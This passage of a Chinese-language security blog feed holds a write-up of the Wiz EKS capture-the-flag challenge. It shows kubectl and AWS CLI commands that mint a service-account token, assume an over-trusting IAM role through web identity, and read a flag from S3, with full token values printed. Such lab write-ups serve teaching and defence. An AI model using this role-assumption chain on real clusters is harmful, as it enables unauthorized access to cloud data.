&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>/api&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>get&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>/apis/*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>get&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>/apis&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>get&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>/healthz&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>get&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>/healthz&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>get&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>/livez&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>get&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>/livez&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>get&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>/openapi/*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>get&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>/openapi&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>get&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>/readyz&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>get&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>/readyz&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>get&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>/version/&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>get&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>/version/&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>get&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>/version&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>get&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>/version&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>get&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>podsecuritypolicies.policy &lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>eks.privileged&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>use&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># kubectl get sa&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>NAME SECRETS AGE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>debug-sa &lt;span style="color:#ae81ff">0&lt;/span> 323d
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>default &lt;span style="color:#ae81ff">0&lt;/span> 323d
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s3access-sa &lt;span style="color:#ae81ff">0&lt;/span> 323d
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># kubectl get sa s3access-sa -o json&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;apiVersion&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;v1&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;kind&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;ServiceAccount&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;metadata&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;annotations&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;eks.amazonaws.com/role-arn&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;arn:aws:iam::688655246681:role/challengeEksS3Role&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;creationTimestamp&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;2023-10-31T20:07:34Z&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;name&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;s3access-sa&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;namespace&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;challenge5&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;resourceVersion&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;671916&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;uid&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;86e44c49-b05a-4ebe-800b-45183a6ebbda&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># kubectl get sa debug-sa -o json&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;apiVersion&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;v1&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;kind&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;ServiceAccount&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;metadata&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;annotations&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;description&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;This is a dummy service account with empty policy attached&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;eks.amazonaws.com/role-arn&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;arn:aws:iam::688655246681:role/challengeTestRole-fc9d18e&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;creationTimestamp&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;2023-10-31T20:07:37Z&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;name&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;debug-sa&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;namespace&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;challenge5&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;resourceVersion&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;671929&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;uid&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;6cb6024a-c4da-47a9-9050-59c8c7079904&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>s3access-sa ServiceAccount 关联的IAM 角色&lt;code>arn:aws:iam::688655246681:role/challengeEksS3Role&lt;/code>、debug-sa 关联的IAM 角色&lt;code>arn:aws:iam::688655246681:role/challengeTestRole-fc9d18e&lt;/code>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># kubectl create token debug-sa --audience=sts.amazonaws.com&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>eyJhbGciOiJSUzI1NiIsImtpZCI6ImYzNTRmMjJkYTA2MTg3MDNhY2Y4NjI3MDQ0ODU1Yjc4NThiZGZlZTMifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXhwIjoxNzI2NzYwMDQ4LCJpYXQiOjE3MjY3NTY0NDgsImlzcyI6Imh0dHBzOi8vb2lkYy5la3MudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vaWQvQzA2MkMyMDdDOEY1MERFNEVDMjRBMzcyRkY2MEU1ODkiLCJrdWJlcm5ldGVzLmlvIjp7Im5hbWVzcGFjZSI6ImNoYWxsZW5nZTUiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVidWctc2EiLCJ1aWQiOiI2Y2I2MDI0YS1jNGRhLTQ3YTktOTA1MC01OWM4YzcwNzk5MDQifX0sIm5iZiI6MTcyNjc1NjQ0OCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmNoYWxsZW5nZTU6ZGVidWctc2EifQ.BcVbC1UoAkeEdLJ88losqbxU1jJye07QJbbQ4yduWjL-h0mpjAluEIWgskI89LUF4NDDgBCbxupfNotWnFeGSS8Yf5mKXTJhNvzG02fNkimAmqjdgiLzCqbdvVa2TA2Afmjes0Y0jppLNDXtAPneumF948Hbxhry68xy-uiAiCOEiLtIwIIOrt_upniKbCyXN9U7EDGpPagO0S-8FaStDrarANEosda7f4WNKhZCHBOlnFfeCShJLVu0fDyEpUovjod-2TEEua0_fIihdnp3qhYurg7VHkkuzYz7bz72PmHtuThjm5MREnndGZbVv3u1rIlZRmtZnqjrLuthkG1K5Q
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
&lt;li>上述jwt的payload为下&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-json" data-lang="json">&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;aud&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;sts.amazonaws.com&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;exp&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">1726760048&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;iat&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">1726756448&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;iss&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;https://oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;kubernetes.io&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;namespace&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;challenge5&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;serviceaccount&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;name&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;debug-sa&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;uid&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;6cb6024a-c4da-47a9-9050-59c8c7079904&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;nbf&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">1726756448&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;sub&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;system:serviceaccount:challenge5:debug-sa&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># aws sts assume-role-with-web-identity \&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>--role-arn arn:aws:iam::688655246681:role/challengeEksS3Role &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span>--role-session-name challengeEksS3Role &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span>--web-identity-token &lt;span style="color:#e6db74">&amp;#34;eyJhbGciOiJSUzI1NiIsImtpZCI6ImYzNTRmMjJkYTA2MTg3MDNhY2Y4NjI3MDQ0ODU1Yjc4NThiZGZlZTMifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXhwIjoxNzI2NzYwMDQ4LCJpYXQiOjE3MjY3NTY0NDgsImlzcyI6Imh0dHBzOi8vb2lkYy5la3MudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vaWQvQzA2MkMyMDdDOEY1MERFNEVDMjRBMzcyRkY2MEU1ODkiLCJrdWJlcm5ldGVzLmlvIjp7Im5hbWVzcGFjZSI6ImNoYWxsZW5nZTUiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVidWctc2EiLCJ1aWQiOiI2Y2I2MDI0YS1jNGRhLTQ3YTktOTA1MC01OWM4YzcwNzk5MDQifX0sIm5iZiI6MTcyNjc1NjQ0OCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmNoYWxsZW5nZTU6ZGVidWctc2EifQ.BcVbC1UoAkeEdLJ88losqbxU1jJye07QJbbQ4yduWjL-h0mpjAluEIWgskI89LUF4NDDgBCbxupfNotWnFeGSS8Yf5mKXTJhNvzG02fNkimAmqjdgiLzCqbdvVa2TA2Afmjes0Y0jppLNDXtAPneumF948Hbxhry68xy-uiAiCOEiLtIwIIOrt_upniKbCyXN9U7EDGpPagO0S-8FaStDrarANEosda7f4WNKhZCHBOlnFfeCShJLVu0fDyEpUovjod-2TEEua0_fIihdnp3qhYurg7VHkkuzYz7bz72PmHtuThjm5MREnndGZbVv3u1rIlZRmtZnqjrLuthkG1K5Q&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Credentials&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;AccessKeyId&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;&amp;lt;AccessKeyId&amp;gt;&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;SecretAccessKey&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;&amp;lt;SecretAccessKey&amp;gt;&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;SessionToken&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;IQoJb3JpZ2luX2VjECcaCXVzLXdlc3QtMSJHMEUCIDcbjnWUDjoa31ZbJzDweonM8dTgcBZri+WNL504ueyUAiEAgPCkBJqsnD0t9t3KtIFIw+RHrwCe5qhA+OBYwpk1cukqwwQIYBABGgw2ODg2NTUyNDY2ODEiDI5P3yVI2koiJMZmayqgBOLSoAE9XgRz73q7PYyDVR0YARfJo8P5XVrOex9PgGJOw18K6BhC87CDwwvGt1XEYx87dgemRZSjfdVaGqD3JsQY0xuHt49tvEvFIsl6LsIRmKvVOOGo53pxnQ6eS0ZZVxEs9FpJ+j/bNurDW8D9JbEz6eSgDxtAveUjrDWZ4v9NsacnUCTm5XW1VrF43bu1dqNcalWj45BQ1IGLYHwBtDIMkuI9KTDyBqxtmzaB6Ku09oUntydlNY32EMA1cklo4ehcort19vw26zvLpEH5bEt8ldtdK4pnxsgMr8lLhtuzFJa6XUpwajzXMRy9D+tfIkQwxrTPqs5ow0t4reNH4/DEjdtSbCtyeTz64Ts6QRK8RXPTzHNe15Yr0fMbw6H0Zw1y7ahU+uBVIIz7EftmVkBayQwSJ5YL9uiZQwIt7jZtVOZMihEYH9j4N5jqeiY86R975dI0RH0mvdXJbWgFVMD4z62sRaNn4LvKbmIOkXRRL1xytK1aISF5OGAcrz76hiJ30KkaW+/8gG3YwdrpAhP11DJ/HU6m2xclgTMieHRR/yUZq+7BnKmiDWPGhBkpLunxORziJIjCcHhMbh8MWNA/uALBv1TTrbL3JHk7fUPhunFcmDns+FoUws67ui9hb37ZaXk4GW5ZMPDuP5kLyq8tQ1v60QDiRD23IJRbJTfzwVDATHC2iIQcTW81Z06l7tUlAtLUYdP5JPo8nAlDZaEwie2wtwY6lQFvNBD0vF7JaviuguAkhw/b13oudjO+J3D78jqppNfBj9JDiV1lCSZH2ZRcAcKfxbVHjIaXyccCvEwmFW/b0qLOaEBvimQ2mXMs/D9qU3tXOVB/Vkl/cYy3rcC5n9d3XG2Uv0byKA9tOzAfy5f3DgoOvPgeC6gsTz7OKA3uHjWusmr/XJ/dl4TAED1XyRrKXr4ezHWjDg==&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Expiration&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;2024-09-19T15:34:49+00:00&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;SubjectFromWebIdentityToken&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;system:serviceaccount:challenge5:debug-sa&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;AssumedRoleUser&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;AssumedRoleId&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;AROA2AVYNEVMZEZ2AFVYI:challengeEksS3Role&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Arn&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/challengeEksS3Role&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Provider&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Audience&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;sts.amazonaws.com&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># export AWS_ACCESS_KEY_ID=&amp;lt;AWS_ACCESS_KEY_ID&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># export AWS_SECRET_ACCESS_KEY=&amp;lt;AWS_SECRET_ACCESS_KEY&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># export AWS_SESSION_TOKEN=&amp;#34;IQoJb3JpZ2luX2VjECcaCXVzLXdlc3QtMSJHMEUCIDcbjnWUDjoa31ZbJzDweonM8dTgcBZri+WNL504ueyUAiEAgPCkBJqsnD0t9t3KtIFIw+RHrwCe5qhA+OBYwpk1cukqwwQIYBABGgw2ODg2NTUyNDY2ODEiDI5P3yVI2koiJMZmayqgBOLSoAE9XgRz73q7PYyDVR0YARfJo8P5XVrOex9PgGJOw18K6BhC87CDwwvGt1XEYx87dgemRZSjfdVaGqD3JsQY0xuHt49tvEvFIsl6LsIRmKvVOOGo53pxnQ6eS0ZZVxEs9FpJ+j/bNurDW8D9JbEz6eSgDxtAveUjrDWZ4v9NsacnUCTm5XW1VrF43bu1dqNcalWj45BQ1IGLYHwBtDIMkuI9KTDyBqxtmzaB6Ku09oUntydlNY32EMA1cklo4ehcort19vw26zvLpEH5bEt8ldtdK4pnxsgMr8lLhtuzFJa6XUpwajzXMRy9D+tfIkQwxrTPqs5ow0t4reNH4/DEjdtSbCtyeTz64Ts6QRK8RXPTzHNe15Yr0fMbw6H0Zw1y7ahU+uBVIIz7EftmVkBayQwSJ5YL9uiZQwIt7jZtVOZMihEYH9j4N5jqeiY86R975dI0RH0mvdXJbWgFVMD4z62sRaNn4LvKbmIOkXRRL1xytK1aISF5OGAcrz76hiJ30KkaW+/8gG3YwdrpAhP11DJ/HU6m2xclgTMieHRR/yUZq+7BnKmiDWPGhBkpLunxORziJIjCcHhMbh8MWNA/uALBv1TTrbL3JHk7fUPhunFcmDns+FoUws67ui9hb37ZaXk4GW5ZMPDuP5kLyq8tQ1v60QDiRD23IJRbJTfzwVDATHC2iIQcTW81Z06l7tUlAtLUYdP5JPo8nAlDZaEwie2wtwY6lQFvNBD0vF7JaviuguAkhw/b13oudjO+J3D78jqppNfBj9JDiV1lCSZH2ZRcAcKfxbVHjIaXyccCvEwmFW/b0qLOaEBvimQ2mXMs/D9qU3tXOVB/Vkl/cYy3rcC5n9d3XG2Uv0byKA9tOzAfy5f3DgoOvPgeC6gsTz7OKA3uHjWusmr/XJ/dl4TAED1XyRrKXr4ezHWjDg==&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag - &lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wiz_eks_challenge&lt;span style="color:#f92672">{&lt;/span>w0w_y0u_really_are_4n_eks_and_aws_exp1oitation_legend&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="思考-4">思考&lt;/h3>
&lt;ul>
&lt;li>创建 ServiceAccount 令牌的权限在 Kubernetes 环境中可能成为权限提升的重要途径。拥有此类权限的恶意行为者可能会假设比他们自己更广泛访问的角色，从而导致未经授权的操作。&lt;/li>
&lt;li>信任策略定义了哪些主体可以假设角色，任何配置错误都可能使系统暴露于安全风险，例如未经授权的访问或角色假设。&lt;/li>
&lt;/ul></content></item><item><title>Wiz K8s Lan Party</title><link>/posts/2024/wiz-k8s-lan-party/</link><pubDate>Tue, 03 Sep 2024 22:33:34 +0800</pubDate><guid>/posts/2024/wiz-k8s-lan-party/</guid><description>&lt;img src="/img/2024/wiz-k8s-lan-party.jpg" alt="Certificate" class="center" style="width:70%;" /></description><content>&lt;img src="/img/2024/wiz-k8s-lan-party.jpg" alt="Certificate" class="center" style="width:70%;" />
&lt;h2 id="challenge-1-recon">Challenge 1: RECON&lt;/h2>
&lt;h3 id="题目">题目&lt;/h3>
